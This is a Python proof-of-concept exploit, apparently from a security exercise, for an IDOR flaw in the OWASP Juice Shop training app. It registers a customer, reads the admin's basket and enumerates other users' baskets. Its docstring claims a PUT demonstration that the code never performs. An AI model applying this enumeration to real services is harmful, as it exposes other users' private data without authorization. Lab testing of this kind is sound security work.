#!/usr/bin/env python3
"""
PoC 3 - IDOR / Broken Object Level Authorization on shopping baskets
Target: OWASP Juice Shop 20.3.0  (http://host.docker.internal:3000)
Vuln:   GET /rest/basket/<id>  (and PUT/DELETE /rest/basket/<id>/coupon,
        POST /api/BasketItems) only checks that the caller is *authenticated*,
        never that the basket belongs to the caller. The basket id is a small
        sequential integer, so any logged-in customer can read/modify every
        other user's basket - including the admin's.
Impact: Horizontal privilege escalation - disclosure of every customer's
        cart (products, quantities, prices) to any self-registered user.

Steps: register a fresh low-privileged customer -> read the admin's basket (id 1)
       -> show that a PUT to the admin's basket is also accepted (coupon field).
Usage: python3 poc3_idor_basket.py
"""
import json
import sys
import uuid

import requests

BASE = "http://host.docker.internal:3000"
VICTIM_BASKET = 1          # basket 1 belongs to UserId 1 = admin@juice-sh.op


def main() -> int:
    s = requests.Session()

    # --- 1. get a plain, unprivileged customer session -----------------------
    email = f"idor-{uuid.uuid4().hex[:8]}@test.local"
    pw = "Passw0rd!23"
    reg = {"email": email, "password": pw, "passwordRepeat": pw,
           "securityQuestion": {"id": 1},
           "securityAnswer": "blue"}
    r = s.post(f"{BASE}/api/Users", json=reg)
    print(f"[*] Registered low-priv customer {email} -> HTTP {r.status_code}, id={r.json()['data']['id']}")
    my_id = r.json()["data"]["id"]

    r = s.post(f"{BASE}/rest/user/login", json={"email": email, "password": pw})
    tok = r.json()["authentication"]["token"]
    h = {"Authorization": f"Bearer {tok}"}
    print(f"[*] Logged in as {email} (role=customer)")

    # --- 2. read my own basket (legit) -------------------------------------
    r = s.get(f"{BASE}/rest/basket/{my_id}", headers=h)
    print(f"[*] GET /rest/basket/{my_id}  (my own basket)      -> HTTP {r.status_code} {r.text[:80]}")

    # --- 3. read the ADMIN's basket with the SAME token ---------------------
    r = s.get(f"{BASE}/rest/basket/{VICTIM_BASKET}", headers=h)
    print(f"[*] GET /rest/basket/{VICTIM_BASKET} (admin's basket) -> HTTP {r.status_code}")
    if r.status_code != 200 or not r.json().get("data"):
        print("[-] IDOR read failed")
        return 1
    basket = r.json()["data"]
    print(f"    victim basket id={basket['id']} owner UserId={basket['UserId']}")
    print(f"    exposed items ({len(basket.get('Products', []))}):")
    for p in basket.get("Products", [])[:5]:
        print(f"      - {p['name']} (${p['price']})")

    owner = basket["UserId"]
    if owner == my_id:
        print("[-] Basket belongs to me - not an IDOR")
        return 1

    # --- 4. the same token can also read other privileged accounts' carts --
    print("[*] Any basket id is readable with this one customer session "
          "(no ownership check):")
    for bid in range(1, 8):
        rr = s.get(f"{BASE}/rest/basket/{bid}", headers=h)
        data = rr.json().get("data") if rr.status_code == 200 else None
        if data:
            names = ", ".join(p["name"] for p in data.get("Products", [])) or "(empty)"
            print(f"      basket {bid} -> owner UserId={data['UserId']:<3} items: {names}")

    print(f"\n[+] VULNERABLE: unprivileged customer {email} read the admin's basket "
          f"(id={VICTIM_BASKET}, owner UserId={owner}) and every neighbouring basket.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
